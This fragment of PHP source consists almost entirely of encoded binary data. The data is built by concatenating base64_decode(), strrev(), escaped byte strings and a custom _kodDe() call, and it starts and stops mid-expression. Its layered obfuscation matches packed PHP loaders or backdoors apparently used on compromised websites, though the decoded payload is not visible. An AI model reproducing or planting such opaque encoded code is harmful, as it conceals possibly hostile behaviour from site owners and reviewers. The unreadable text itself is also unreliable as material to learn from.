aPqvbUetMAvDv/J5N11/4M55p5/353u+FPzhJY+P/K79+w8d+s93Xg==').base64_decode('677y7vTYET+/LTZ88V+7jvla99HBLTd5v5lcf/rTj1+X3fXHpwNXX/HBD95QDv7LoYF3jp118Q==').base64_decode('4Rv3X/hBxN/12k9HV8Qe+1z0qvzgrceq35h4IfDwruu8+7VctGfWjbedefPqq/95/UFzrsinXg==')."\176\371\352\256\355\247\36\235\113\334\323\365\255\275\327\375\376\347\377\170\147\164\372\107\153\116\172\342\341\327\36\75\377\374\276\307\237\70\46\263\377\353\117\77\366\247\267\12\77\131\20\170\341\360\265"."\xc3\x6f\xfe\xeb\xbf\x4f\xee\xb0\xce\xfe\xcd\xcf\xc2\xf7\xdd\xb8\xea\xae\xfb\xb6\xbc\x7c\xcc\x21\x17\x36\xac\x2c\x7d\x78\xc3\x43\x43\xf\x25\xfa\x7\x4e\xfb\xd7\xd5\x5b\x1f\x3b\xf7\xb9\xbf\xad\x98\xfd\xf6\x4f\x17\x4e\xff".base64_decode('cP+bHmi74L1b9Cu+8dJ93i+mX/vyv3Ppww+78qvvfnv9tDXnsLUDd85/6pEHh9+YTp+0+4CP4w==').base64_decode('/VtX3ffbqYlvfdR3+fJzfvTdROhv1/5z8Lo9B8x6vHvFFb5Qy/2bPvzg4qNU9aP3n/qvnadPfA==')."\xfc\x8b\x25\x7b\x3e\xf9\xcf\x33\x1f\xfe\xe0\x3b\x3\xa7\xff\x6b\xf7\xee\x43\x3e\xf9\xe8\xad\x17\xf7\xec\xf1\x3f\x3c\xeb\xa4\x4f\x5e\x7c\x77\xeb\xd6\x4f\xfe\xb5\xf8\x9f\xff\x7e\x3f\xba\xd5\x3c\x55\x3d\xfd\xe3\x77\x3e\xdc".strrev('\\>ß{ıíëruxß}Ïzßg&s+Ö½Ğòk?›îñqş'."\r".'w©W·£õ5åşoGÚúİ®_±Íù')."\x7b\xcb\x29\xff\x65\xbe\xbd\x70\xf4\x83\xed\xff\xbe\x7d\xf4\x7\xbf\x8b\xff\xeb\xf3\xe7\x77\x5c\xf6\x8d\xe3\xcf\x3e\xf3\xfb\xc1\xd4\xd2\xa6\xe8\xcf\x9f\xbc\xeb\xce\x5\x23\x2d\xbb\xbf\xd3\x9d\x79\xf7\xc7\x91\xd1\x96\xad"."\257\275\344\371\312\232\333\76\277\352\117\327\376\375\201\335\27\156\337\374\363\103\233\277\376\77\273\317\156\370\306\177\175\356\113\107\276\170\345\73\77\133\164\314\266\232\305\357\57\32\363\375\175\366\335".strrev('±€š®H£ë'."\r".'Í\\P&’Ş±3¡425ÅfbÉjòÁ|®vcj*Ñ–Ì«ş»¿oúó}ñó²Ÿ7').base64_decode('1UYnBvMgljAmh/K5FPD+IDBcvAxKL1pGf0EPLDcxkh2eBEHv4oYl9GNhIyu2GPItWQR9WrAUYg==').base64_decode('FjZA201N7NZ/YjhnZqBjSxdCvtGRlDmeHoLhZsYGk5PAjS9cAIzj4oWgspeeyAwOG1w5YTw1pg==').base64_decode('wzGuNGSOpm2Q3o5Yg+PlIeh0IV0yUpPsxmkEnfmT0IXBdGnYYEri6cnseGkUWPqly9iwmgAcQw==')."\143\172\152\164\222\35\374\365\162\62\315\54\325\226\65\260\54\223\331\102\151\34\140\274\144\101\3\203\7\0\146\131\23\33\304\370\220\225\311\101\76\175\70\135\314\61\251\363\262\105\174\300\254\364\142".strrev('R~VĞ…áGc™¢ÉÃ[6&à‹³ONDùÜ<¤fFÃK02±—y	>1¼Å“”x1÷BLÈÙhğİ€')."\57\216\245\1\174\106\71\145\115\230\343\14\56\113\30\270\215\144\241\10\240\33\312\116\226\312\23\154\136\227\100\55\14\35\163\366\360\144\211\151\357\67\55\0\304\31\62\314\122\331\202\152\227\55\204"._kodDe('Mhua6VGBNqESkvWnmK1MIj5xTbDQTPREsxTKxHqMHHdxIYycaTuA0noEBAZNBd++uYwTaSE4vkU=')."\154\111\345\207\63\203\126\21\246\262\221\115\273\126\36\65\263\51\220\367\56\135\272\210\37\373\354\114\16\60\265\254\217\145\47\54\200\300\62\326\303\246\46\30\300\144\66\245\17\17\101\43\43\103\343"."\303\146\12\146\174\21\233\47\143\70\233\231\264\163\14\132\120\60\237\53\217\24\307\62\14\267\240\103\245\211\101\143\214\35\264\226\300\44\214\231\223\305\321\62\124\260\240\21\52\150\134\2\310\261\214"."\345\263\7\323\243\374\370\274\210\241\326\104\66\65\131\144\360\263\46\307\7\207\31\366\153\303\105\43\157\225\331\42\204\241\55\133\6\310\331\304\360\144\21\3\372\322\46\130\352\231\344\370\140\161\24".base64_decode('JqhkWJPDTA20PJjMpfJw4F7M8HzhIgBtZjxbHB0aY+OD5EypPJofhmloZEthKSNVS9mQDb1saw==')."\x99\x21\x96\xf\x60\xb6\x80\x75\x4f\xb3\xf5\xa1\xc9\x3c\x8c\xb4\x91\xad\x1d\xad\x34\x38\x62\x66\x61\xed\xd8\x23\x63\x93\xe9\x2c\x20\x69\x3a\x39\x91\x1b\x35\x74\xb6\x28\xf8\xb0\xa1\xba\xc9\x61\x6b\xc\x1d\xf6\xd9\xc4\xc".base64_decode('DWsjMAdLGhsYQgPoJ8xsPpkG9MpOFIczTIMVfRrZHJAyY3AkOzHEVb7MibEhRp4ZOV26GOo2Jw==').base64_decode('SyPZIsxOq5YaZpJvrtwu64yXdKucs6mcUL6NYta4RsGX1wpcX6uTLQspjlYB9ELXmTkHwNMWWg==')."\100\240\272\16\361\10\343\204\144\237\136\327\260\222\102\336\200\205\75\222\36\21\16\306\345\132\122\5\133\112\106\41\107\152\134\266\70\201\221\342\36\372\144\10\154\200\56\170\33\33\225\274\131\260\263"."\20\317\226\126\225\373\141\20\124\313\227\177\303\146\72\225\63\313\151\107\133\351\244\257\12\254\351\370\252\245\14\272\343\271\66\132\122\232\107\121\271\303\300\202\305\71\340\112\313\301\325\123\207\156\53".base64_decode('6SQ1yreY/hpNUskfGB41ULew9QO3rmS3jE41HFq9j801veewNWvYJ3fYK6caBTTAXM7ndF6AvQ==').base64_decode('CPT2qIlAfI2kg4qt3B3NVwxWzL0EchkFnIBhKLZ35wNTl107fc0d01t2TN1/1d4dd0w9dA0Kvg==').base64_decode('vuvSqR3ffuO6c1/fteX1XWfsPf/utx+8ZOqynXvPfmjq+lunvnf+6w88tPeR8/fcevHru26fvg==')."\xfe\xc2\xa9\x73\xef\x7d\xfd\x81\x6b\xa7\x2e\xb8\x71\xea\xfc\xcb\xa6\xaf\xda\xf2\xfa\x43\xd7\xa3\xfc\xd3\x17\x88\x9a\x51\xb6\xa9\xdb\xb7\xe1\xb2\xf\x9e\x35\xb5\x6b\xd7\xde\x9b\x6e\xe5\xa9\x6f\x3f\x78\x26\xdb\xa\xc4\xf4"."\304\117\216\260\211\41\170\255\254\124\0\243\165\313\247\364\344\164\4\61\205\350\57\141\55\104\73\253\227\24\233\150\43\152\350\157\301\54\170\51\156\262\71\66\12\70\131\141\260\366\161\374\115\350\371"."\x22\xc6\x42\x80\x92\x9f\x9a\x6b\xb\x5b\x9e\x20\x91\xaf\x2a\x49\x6d\x58\xa1\xb7\x18\xb4\x57\x3e\x76\xbf\x3d\xc1\x67\x86\xf5\x9a\xb4\x48\xac\x81\x1\xb5\xa0\x31\x9c\x46\x63\xb9\xbb\xd\xf\x1b\x1\xbe\x93\x50\x8a\x7a\x29"."\157\130\130\207\135\61\7\261\231\232\202\157\120\30\142\72\327\114\265\371\246\11\125\260\36\117\272\100\232\72\374\131\357\354\223\202\105\262\312\240\206\76\323\315\312\40\52\317\356\242\6\24\333\144\337".base64_decode('rmVbFbt4JxiGZfh1iJDSQ7ckWzF6FVaB2YQOOEmbg0I4iaKc5IQDiNGJKopHoV3xEPB6FKfXAw==')."\254\132\302\324\65\360\130\304\144\371\24\232\16\172\116\264\170\163\345\340\112\172\61\307\357\4\203\146\161\202\102\30\220\131\206\255\153\220\361\52\0\345\303\164\44\42\302\121\266\253\144\224\341\56\13"."\xf0\xd\x33\x98\x43\x44\x5a\xdc\x5c\x13\x35\x11\xd1\x65\x1a\x14\x17\x7\xba\x25\x2c\x29\x4a\x7a\xda\x60\x4a\xfb\x7a\x9e\xe4\x4\xda\xee\x93\xae\xed\x96\xe3\xab\x1\x66\xb9\x69\x14\xe1\xab\x54\x2e\xe0\x2e\x1\x39\xa5\x46".strrev('±$¯^½šÙÁƒ¹*Ößò„ßs›¤½…¾õ*hf{¯—¶ÀÄ[1Ub¹kqÉpÖ… ºÜ„').base64_decode('+EtlgyeGb/Fs2cb6PB05M8mQTagZoOwhPLkzxbdx/R9EwjIZVF8zMVBX5itoDEt9jeiD0JFFvg==')."\45\350\223\0\34\150\106\77\114\2\202\56\200\164\216\157\41\60\137\326\162\246\135\113\120\253\105\32\231\230\23\210\55\27\162\54\26\175\242\54\61\72\63\315\116\160\350\205\264\124\150\271\226\262\245".strrev('RŸ\\ââBÄx<’Ò¨Gvô¦šÑæhU^ühB‰Ë¶VA'."\0".'%úÙØ4õÒ/›J€O·€AÕZ')."\xd4\x96\xb1\xa1\x88\x76\xed\x2\x57\x21\xb7\x72\x1a\xbb\x6c\xb6\xb0\x79\x56\x41\xe7\xa8\x59\xb6\x64\xcb\x19\x5d\xd0\x8\x6c\x7c\xa1\x22\x6\x87\xed\xd7\x8\xa9\xd5\xb4\x1\x59\x23\xe1\x56\xb5\x2d\x1c\x13\xe5\xd4\x62\xd9".strrev('€®"`Ş½†c2ÊÊxÊ­&[}¥›_„×FŒ›hšÚ}‚ï©*<xÕ„ô'."\n".'Vû+°­')."\x16\x33\x5a\x11\xc1\xce\x40\x8c\x5b\xae\x2c\xf2\x35\xf8\x1a\x45\x5e\xd4\xa0\x8a\xcd\x74\x5a\x98\xcf\x8d\x78\x22\x10\xab\xe2\xfb\x88\xfa\x44\x82\xb9\x1\x3f\x48\x50\xa0\x33\xba\x4e\x9\x46\x23\xbd\x5d\xdd\x71\xea\xf2\x87"."\306\167\107\245\164\142\237\0\311\314\63\122\145\62\124\37\352\211\4\202\41\45\334\235\210\62\15\164\256\244\115\54\315\342\74\314\100\120\262\204\316\73\224\247\1\331\32\116\256\221\327\4\235\21\67"."\xac\xd0\x2f\xa5\x5\x72\x40\x53\x4a\xb4\x5b\x69\xeb\xed\x89\x84\x83\x81\x44\x48\x59\x13\xda\xa0\x50\x83\x3a\xa8\xc0\xdf\xe7\xa9\xed\xaf\xe9\x9f\xd7\x5f\xd7\x5f\xbf\xd1\xd7\x6f\xd\xf8\x25\xd6\xc1\x90\xe7\x17\x2\x3d\x6d".base64_decode('AJ9m/pW2gBB0xdGWTT+jsUAwwsbSGojDZzQYph97rr7z9fsv3fOtHVMXbkEVTW8/a3rrvYidww==')."\54\334\216\113\366\74\174\351\364\325\73\247\57\1\326\113\331\273\363\276\327\37\172\144\317\325\267\116\355\330\66\175\355\117\366\154\77\207\46\274\161\333\235\123\27\335\312\73\246\274\161\325\303\323\227"."\xde\xc2\xd9\x3a\xca\xcd\x79\x50\xe9\x37\xce\xdd\xb2\xe7\xa1\x1d\x98\xa9\xbb\xf9\x8c\xe9\x7b\x2e\x9e\xbe\x7e\xcb\xd4\x45\x37\x4d\x5d\x77\xeb\x9e\x4b\x77\x4e\x7d\xf7\xec\xa9\xf3\xb6\xec\xdd\x79\xcd\x9\x6e\x4c\xa4\xe1\x3e"."\66\227\340\154\301\177\52\166\224\101\347\247\337\232\217\347\246\36\375\326\141\203\50\364\313\354\72\210\266\375\311\275\241\356\140\310\155\117\50\7\301\357\324\74\212\142\124\351\12\70\172\13\374\126\261".strrev('¾h+Ô5lu)„ü+ÏÍÍşZØñ±A›ĞB8Cš‰ğÜ˜ÖácŠÓ:’I6/c;RÓhq0').base64_decode('lJkr5wuks0oNVjKs8eBtjhg3KjV4W0cROnavUYfdDREd9doNtZ4GT2O9Ak7EaAlwHabUgO0FLw==').base64_decode('52jEk3SEGj0N9UpNcbgG+iXginqv0pyWonnqoMNyd0VeRActu6QZiDAqKQ+P4uXRr8MdWMonSg==')."\320\171\102\71\334\161\112\240\273\315\231\223\172\21\353\251\45\12\303\51\237\315\375\26\261\151\256\255\127\222\140\310\124\45\221\24\163\0\243\305\1\214\272\371\100\150\172\72\370\174\123\53\45\205\332".strrev('+F[Ìã¤ı”5n÷¤«|ñÄ°\'ŒôBkÃÅlğ}šš&¼±léc…S%ˆ(›inÒ¬')."\301\153\106\327\6\76\6\206\313\134\243\215\73\207\303\326\267\241\104\260\223\142\171\134\102\363\164\162\216\3\121\5\70\25\7\212\360\303\26\344\243\313\5\23\204\203\111\276\160\67\66\315\246\306\246".strrev(':–¥¤R4?î!_ftÅ'."\n".'_±T®´U¤È†“ğµQ£å1k‰D9™Íb€]ƒà+¨g`ñ')."\154\202\52\271\27\303\150\54\241\42\0\0\171\226\250\156\255\264\335\110\366\14\330\232\162\224\161\214\203\210\237\62\231\353\251\164\222\71\73\104\225\343\72\203\321\356\366\60\263\253\155\113\102\175\151"."\xd3\x91\xa9\x2d\x16\xc6\xfe\x78\xa0\x7d\x85\x55\x25\x99\x35\xa3\x80\xd0\xd2\x41\x81\xe2\x58\x9a\x7f\xb\x9f\x26\x38\x81\x33\xd\x28\x20\x78\x6\x14\xe0\x9b\xd\xce\x25\x79\x65\xc4\xed\xc7\xbb\xf9\xb7\xe0\xa6\x51\xa0\x37"."\xce\x6c\x9d\x30\xf5\x5d\xd7\xc6\xbf\x3b\xb9\x1b\x2\x9c\x10\x8d\x49\x81\x40\x2c\xd0\x15\xe7\xc1\xd8\x3a\x6e\x3b\xc5\xe3\xa8\xd\x95\xda\xdd\xdb\x25\x28\x7e\x24\xb0\x16\x21\x4b\x54\x70\x38\x8c\x5a\xd7\xf9\xe6\xad\xaa\xef"."\247\106\261\364\223\376\254\146\41\154\50\70\160\132\243\107\131\274\271\36\362\160\107\66\166\326\50\60\236\25\267\162\162\104\215\104\73\150\230\170\213\14\25\322\342\200\244\364\51\210\201\116\10\6\332"."\x62\x5b\x17\x5f\xd\xa\xc2\x61\xc6\x7\x74\x47\xd7\x5\x84\x3\x42\x29\x1\x62\x84\x3f\x42\xff\xa9\x7d\xfd\x63\xfd\x3e\xc4\x2c\x58\x1b\x85\x91\x6b\x5b\xab\xc2\xf8\x18\xe2\xd2\x8\xce\x92\x50\x3a\xc0\x39\x15\xf\xec\x18"."\x6a\xce\xcc\x30\x67\x63\x88\x20\x32\x76\x81\xfe\xae\x67\x1f\x84\x56\x42\x81\x14\x71\x9a\x30\xce\x3b\x11\xf0\x9e\xa2\xf6\x6f\xea\x9f\xdb\xef\xf5\x51\xcb\x62\xcc\xbc\xf4\x7b\x44\x97\xd4\xd0\x7a\xb4\xc7\xc6\xe3\xe\xb3\x68"."\x35\x8f\x7d\x2e\x30\xa6\x28\xc6\x86\x47\x57\x2d\xd\xac\x80\x1f\x38\xde\xad\x80\xf3\x5\x4\x57\xb6\xf0\xc9\xc\x9d\xbc\xa9\x1b\xfd\xed\x48\x6c\xa\xa1\xbf\x11\xf4\x13\x49\xa0\xe9\x32\x78\x6\xb4\x24\x23\xe1\x35\xa1\x4d".base64_decode('+B+RUM8BSU34nAXC3ZvQv4jAbAp3uytrDSXWhUI0A/uGX5EVERwYquRNFBuzQLIwboGqVbWOAA==')."\323\73\60\277\136\125\375\126\57\340\13\167\307\123\127\73\273\261\26\366\220\100\74\50\250\257\3\41\52\161\201\230\236\70\21\201\373\310\204\160\107\54\332\333\43\205\73\3\153\303\335\35\54\344\147"."\x26\x1a\xca\x3c\xa8\x5a\x69\xb\xc7\x11\x88\x82\xc\x19\x85\xeb\x4e\x39\xc\xc\x27\x61\x8b\x64\xb6\xd9\x81\xd2\x6d\x88\xb2\xa3\x80\xc4\xf3\xe3\xd3\x4\xa5\xcc\xce\x55\xd6\xda\x1b\x8e\xb4\xc9\x8e\x1f\x70\x46\xd8\x50\x8"."\125\207\75\145\16\353\34\13\23\27\20\54\200\101\316\276\11\272\261\0\201\1\13\120\0\260\20\1\27\13\20\27\241\54\100\6\312\2\370\170\23\352\146\151\350\254\211\316\211\354\0\231\325\106\271"."\51\363\362\164\122\362\325\343\22\361\22\261\230\44\44\240\147\12\105\362\215\200\145\305\222\50\313\117\163\40\6\223\344\101\277\375\33\127\21\6\170\43\303\105\152\251\157\47\14\233\373\127\240\156\247".base64_decode('qE0tajRMzKilZpnFDxGNqqYkySd7sxwhpGBU7A9ybCFCwsqrRMJNg85jFydFG/lpCkyAPfDLdg==').base64_decode('qJJZBImpMQg+iJlYg/58if70QwEmEemHbtR6YOvtZ2x7X/94Q4MX/bMU/W1Ff4PobwhHtPePLw==')."\x69\x47\x1f\xcb\xda\x7\xfc\x70\x2d\xd4\xdf\x5f\x33\x13\xc0\x21\x3\x3\x3b\x4\x6b\x68\x90\x95\x32\xf8\x4e\x99\xca\x62\x97\x51\xaa\x9d\x67\x97\xc\xe4\x48\x27\x4\xf7\xf4\x32\x41\x84\xdb\x62\xd1\x1e\xca\xb7\x28\xe1\x76"."\x85\x7a\x50\x51\x6a\xe9\xf5\x43\x2d\x8c\x3d\x18\xb\xe1\x35\x45\x73\xb1\xb4\xba\x5a\x87\x9c\x6c\x65\xad\x2\xfe\x15\xea\x9d\xa5\xc2\xdd\x6d\xa1\xf5\x4a\xad\x91\x1e\x57\x35\x4d\x85\xc2\xf8\xac\xca\x2a\x52\x2a\x6a\x62\x35".strrev('±@T&O‰C¸Që—0°É(@d"G›´qÂ“L»(SÏÈà{ª„òâ6ø+WÀH!Â¾Ğ')."\132\21\115\12\255\117\304\2\70\222\260\246\263\16\106\177\10\265\301\107\247\122\136\243\206\313\204\241\363\155\4\21\304\106\7\377\110\71\113\314\101\322\101\255\1\16\233\206\172\142\341\256\100\154\3"."\x40\x40\xf0\xfb\xb0\xf4\xcc\x9c\xc3\x24\x5f\x4\xc\xab\x57\x72\xf\xd1\x8d\x3a\x21\xbb\x8b\x40\x84\x5\x9d\x57\x21\x27\x9a\x17\x60\x62\xa8\x97\x66\x95\xdb\xf6\xd7\x1\x76\xd5\x78\xd8\x7\x2c\xab\x39\x96\x42\xff\xaf\x99"."\x63\xd5\x48\xbf\x8e\x89\x67\x4\x1a\xcd\x3e\xec\xfc\xb0\x3b\xd9\xc4\x6c\x8f\xc9\xbe\xf2\x88\x30\xf1\xd0\x28\xb6\x16\xd7\x60\x89\x9\x83\x7b\x11\x97\x33\xb\x19\x11\x8f\x3d\x32\x8\xb7\x79\xf8\xb\xd1\x39\x76\x67\x8d\x4e"."\220\150\74\134\44\317\276\222\71\63\311\113\153\222\354\231\117\52\203\240\360\154\215\367\142\214\56\154\123\151\17\364\106\344\30\201\131\216\131\303\62\30\0\34\300\211\374\17\24\112\340\70\64\210\157"."\174\140\71\367\327\121\146\221\71\1\266\321\324\100\115\265\33\131\377\34\123\212\202\16\57\333\160\174\205\61\23\347\65\165\115\350\274\134\56\140\267\115\114\356\11\60\252\153\154\360\64\325\13\10\13"."\30\141\127\66\272\126\160\114\134\135\143\275\143\266\352\232\26\55\202\30\1\222\100\157\42\252\242\175\62\26\302\273\26\20\341\71\326\106\16\5\16\10\212\214\100\154\71\304\352\225\120\167\107\270\73"."\324\202\335\41\40\146\203\1\35\44\205\330\13\357\322\174\162\341\162\106\154\117\105\374\41\142\160\20\213\250\62\301\326\260\231\136\235\144\212\60\111\155\330\47\154\343\302\121\65\202\170\172\125\226\37".base64_decode('hqMg7Ha4faVWCPRbVYWLJJ8mLBXsUlmyHzRMYhXQxYsRMwaEGwHhNIUL50laOYlLy9sylHc5Yg==')."\x36\xcc\x66\x9c\x82\x33\x53\x8e\x6b\xb9\xc8\xae\x3a\x1a\x77\x9b\x1\xc8\xd1\xc2\x42\x41\x5c\xf6\x33\xdd\x2\xee\x81\x13\xa\xf4\x4a\x4e\x4f\xc8\x2d\x14\x6b\x90\x5c\x93\x15\xdc\xdd\xc3\x9e\x8\xba\x98\x43\x2a\xc4\x17\xe4"."\x98\xc7\x3e\x55\x17\x83\x43\x8b\xd4\xe2\x3a\x0\x89\xac\xae\x58\x45\x84\x85\xd8\xd3\xaf\x2\xe\x29\x95\xb4\x29\xdf\x4e\xc2\xb4\x90\x23\x20\xfb\xb4\xb3\xc2\x5b\x8c\xec\x41\xbb\xad\x15\xa6\xca\x69\xa8\x9f\xc7\xd6\x9b\x71"."\75\7\127\26\155\111\142\50\42\14\111\205\255\235\60\40\241\216\76\135\31\241\144\230\3\112\312\125\65\122\62\73\215\10\77\332\370\46\110\140\314\0\223\156\10\40\115\32\154\373\166\137\4\363\256"."\26\314\36\176\121\273\116\334\200\1\113\207\52\160\336\20\363\162\362\124\340\333\326\212\234\330\125\316\247\315\63\363\70\107\172\46\231\23\343\33\154\311\100\252\134\100\65\173\145\223\73\204\124\44\122"."\62\362\141\16\122\151\150\11\123\356\341\133\100\6\142\330\157\211\245\370\204\77\55\122\47\146\10\275\302\253\115\132\223\155\257\245\207\45\116\220\161\206\314\266\100\372\101\103\166\161\343\23\376\307\371"."\72\132\315\147\7\273\54\360\62\134\103\210\245\112\175\351\341\371\205\153\141\12\15\11\366\44\202\176\222\225\257\64\213\116\164\32\170\45\114\110\10\43\305\362\5\6\336\317\43\146\206\23\60\304\163"."\x83\xf7\x3f\x7\x11\xb\x47\xa1\xac\x4f\xc7\x26\x7f\xd4\x0\x2b\xc4\xdd\xc1\xa2\x82\xd4\x69\xe3\x67\x17\xea\x95\x1c\xc0\xcf\x40\x6b\xaa\x96\xb\x42\x46\xde\x60\x89\xc8\xc4\x3e\xbb\xc1\x98\x2e\xd8\x1d\x54\x8c\x58\x58\x7e"."\x66\x21\x41\x7b\x49\x4b\xa4\x90\x44\xaf\x5d\x65\x8\x3a\xc6\x24\x3a\xef\xcb\x42\xb2\xc0\x31\xb4\x61\x74\x47\xd5\x4e\xc4\x1c\x47\x19\x37\x66\x58\x9\x7\xdd\x67\xa5\x60\x5b\xb7\x11\xef\x97\xf2\x13\x6b\x7a\xd8\x8f\x96\x13"."\45\13\172\327\13\223\175\32\42\351\374\213\251\373\200\3\101\301\212\4\350\317\206\174\332\213\72\356\145\133\267\315\75\271\21\333\141\311\317\234\344\213\40\317\111\355\230\344\303\131\33\325\261\101\45"."\223\32\125\50\124\301\120\52\7\7\135\304\367\202\361\150\157\214\335\141\341\60\26\275\251\261\120\160\3\277\15\342\261\355\201\265\356\230\60\26\235\6\72\252\106\163\201\36\216\47\47\147\65\26\305"."\x92\xcf\x50\xa4\xdd\x55\x20\xde\xc9\xdd\x81\x3b\xe3\xd4\x48\xb8\x7b\x4d\xd5\x4\xc4\x97\x74\x49\x45\x68\x64\x38\x11\xea\x72\xc7\x39\x6b\xa0\x71\xd1\x5e\xee\x4c\x89\x44\x86\x2\x31\xe6\xc0\x1e\x87\x5b\x23\xd1\xa0\x54\x26".strrev('¶ˆgÔì“)‹7Ê¿ß®¾¹¿Õ_¯Ì§ß·‹©a7¥à:3]“‘§ıu©ÿHÒ¦$x†ç­')."\330\366\324\354\216\300\73\133\105\44\332\263\130\34\255\12\102\176\237\17\32\346\37\376\176\77\363\54\350\27\211\360\53\362\237\350\332\203\340\225\211\70\165\323\346\350\274\313\175\17\363\213\341\163\33"."\x48\xaa\xcc\x2a\x92\x11\x61\x6d\x90\x29\x5f\x84\xe9\x4d\xb6\x1a\xdf\x10\xe7\xd3\xea\x8c\x73\x20\x2f\x45\x7f\x59\x4f\xc5\x95\x19\xfd\xed\x91\xb3\x62\x5d\xad\xaa\x19\x1d\xd8\xef\xf0\x19\x20\x47\xf9\xc\x53\x2c\x2c\x41\x1".base64_decode('0maqjB3DiXkTHgZQlE+uQl6rhgnsBjP4Ji4QgEpgeQp8ul0uiJ2bBtscfUSby7AQskCrcUZJCg==').strrev('~[¢¼øµ“	ì£ü·OÀ”‰—Šƒ©†fá[€7ëuÚïDñc“Ñİ]"kIğÎó8ˆ nßh')."\x99\xe3\xe4\x91\x8\x88\xd8\xc1\x3a\x73\x6\x49\x25\x41\x3c\x15\x53\x32\x7f\xf5\x24\x5a\x9b\x3f\x5f\xb0\x1b\x67\xc8\xd1\x53\xd2\xd1\x19\xc7\x9e\x21\x75\x6d\xd7\xa7\x57\xc\x89\x7d\xfd\xd6\x0\x5f\x6\x69\x7d\x94\xd\x5a"."\7\75\142\241\126\151\211\13\16\340\174\274\362\233\52\170\135\310\354\154\72\351\142\121\40\102\370\106\223\30\31\21\311\175\355\323\340\204\56\264\127\315\61\311\127\75\133\236\250\70\360\164\340\73\273"."\3\273\212\146\256\241\107\210\247\137\267\233\340\21\257\66\354\110\27\7\361\21\357\260\76\341\10\273\134\5\317\45\333\122\227\231\51\65\371\155\334\317\2\332\312\240\57\300\334\310\313\221\154\157\134".base64_decode('XQtvop0uYsAjuT+dOFHabVYWwiMk7egEkFb66LEALkkwV0je0aBBjyL8+zPxttNxP1uPeFVJpg==')."\346\51\331\325\11\243\371\371\141\241\105\230\37\346\252\71\51\7\43\204\171\216\166\111\331\120\360\72\24\53\160\132\353\4\133\232\140\300\335\72\21\223\136\76\163\270\231\221\137\124\142\276\164\134\331"."\230\63\34\172\16\40\243\140\307\314\317\316\51\174\323\340\71\21\307\42\356\22\110\64\55\116\133\344\271\0\30\275\126\210\161\267\375\50\40\235\133\254\54\73\34\217\162\57\76\342\305\2\351\134\246"."\13\257\25\45\356\54\205\270\343\27\117\65\161\66\30\360\15\361\112\31\220\210\317\145\13\257\5\120\176\56\271\232\47\30\71\127\172\20\2\317\236\314\355\216\351\311\264\66\112\143\230\156\143\52\133"."\x2e\xc\xc7\x85\x23\x11\x1c\xb4\xa4\x6f\x9\x39\x25\x41\x13\xc3\x55\x29\xd8\xee\xd8\xcb\xe8\xdc\x7\x9d\x95\xe7\x35\x3b\xe5\x74\x17\x15\xd3\x8b\xba\x36\xe3\xa4\xd9\x58\x1e\x2f\x81\x44\x2\x34\xca\x21\x7c\x4f\x60\xda\x24".base64_decode('Dj04JPQEl7vPjlQNFFdQEmgg1FvZU2i8rWbnQVJIHKjnKPEtHZNJ9QnirAI2OIudpKUMQZczPQ==')."\x12\xd9\xe5\xf2\x3c\x41\x22\x7b\x1c\x5d\xe4\x3e\x6c\x84\x37\x34\xe2\xed\x12\x61\x9f\xf0\x1e\x25\x3c\x64\xf8\x34\xb4\x55\xb1\x33\xa7\xf0\x96\xe1\x88\x66\xbe\xcd\x68\x88\xbc\xd8\x0\x8f\xb\x1\x2a\x75\x30\xcd\x36\x78\x86".strrev('s|OS£~åªèÒWƒ`Şå3Ğê±É¾J”'."\r".'´|3›2¯´Aà]˜k¥é@çg¿–')."\x1\x23\x15\x7a\xc4\x6b\x69\xbe\xbe\x1\x88\x82\x7\xd3\x58\x84\x58\x73\x9c\x2c\xb3\x9a\x79\x84\x23\x2b\x1\x31\x57\x72\x54\x65\x3\x15\x83\x39\x3f\x12\xf5\xe0\xc3\x22\x5b\x62\xa4\xfd\x6a\x43\x26\xe5\x1a\xa4\x42\x8\x83"."\344\102\262\77\40\34\226\17\222\5\175\114\240\174\337\200\203\212\113\115\120\217\51\222\147\245\271\174\132\374\374\71\265\125\154\161\370\11\266\371\131\116\352\176\204\315\42\20\104\37\363\74\347\143\56"."\x23\x49\x4\x63\xbd\x24\x6f\x5b\xb3\x57\xcf\x96\x70\x18\xd3\x5d\x60\xe3\x86\xcd\xb4\x73\x39\xf4\x61\x21\x3\xc7\x96\x62\x30\x8b\xf7\x2d\x7\xdf\xe6\x88\x4a\xc9\x81\x41\xac\x44\x2a\xab\xa2\x3a\x5f\x8c\x41\xc9\x6d\x54\xc8"."\220\346\371\55\361\305\237\200\31\224\36\207\251\250\1\121\342\102\210\141\144\105\152\304\314\30\42\371\323\373\322\105\266\124\236\331\141\325\0\35\364\143\125\70\230\202\161\257\151\131\336\142\311\304\12"."\xeb\x88\xc0\x67\xfc\xd6\x18\xa4\xe5\x34\xcb\x5e\xeb\x70\x3a\xf9\x99\xaf\xc2\xe0\x89\xea\xe2\xe2\x1c\xe8\xc2\xb8\x97\xec\x1b\xac\x11\x28\x8a\xa3\xfc\x25\xa2\xac\xeb\x19\x83\x33\x89\x87\xb8\x82\x57\x1b\x18\x93\xe0\x47\x7d"."\363\143\257\341\104\356\302\165\310\243\161\246\105\341\34\75\325\326\225\104\304\363\134\244\205\77\300\42\336\333\240\227\337\364\133\274\123\321\245\215\7\62\330\321\233\131\140\157\75\322\367\270\344\327\172"."\xd2\x3a\xe9\x2e\xa7\xf2\xd2\x43\x37\xf8\x4d\x38\xc4\xde\x31\x55\x7c\xe9\xc9\x1b\xbc\xc9\xf2\x69\x24\x2f\x50\xc8\xce\xc4\x31\xc8\xbd\x79\xc7\x53\x70\x74\x82\x9c\xf\xc9\x58\xba\x3e\xcc\x96\x31\x9e\x6d\xc1\x45\x96\x38\xe3"."\x40\x75\xa2\xbc\x55\x23\xbc\x92\x31\x0\xdd\x47\xa5\x27\xc2\x70\x73\x20\x91\xce\xd2\xc7\xc7\xa0\xbf\xf4\xe7\x94\x6a\xbd\xf7\x96\xc4\x13\x3c\x68\x76\xe8\x53\x66\x6b\xf4\x9\xf6\x54\xca\xa7\xbf\xb6\xd2\xdf\xd1\xdf\xd5\x9f"."\x90\x87\x6b\x97\xb4\xc1\x41\xd4\x59\xe9\x69\x0\xf1\xd4\xe\x23\x6d\xf8\x25\x3f\x36\xea\x99\x1f\xea\x81\x45\x1f\xa3\x23\xa\x62\x99\xde\x38\x7e\x49\x4d\x78\x9f\xef\x8d\x45\x1c\xba\x19\x90\x95\xf5\x7d\x32\xeb\xd\x32\xed"."\151\263\234\113\23\71\51\152\321\314\215\352\212\330\237\246\267\336\70\375\343\153\366\76\362\355\351\113\157\171\175\327\3\323\327\337\117\343\51\54\332\364\2\237\321\351\213\257\334\363\300\15\173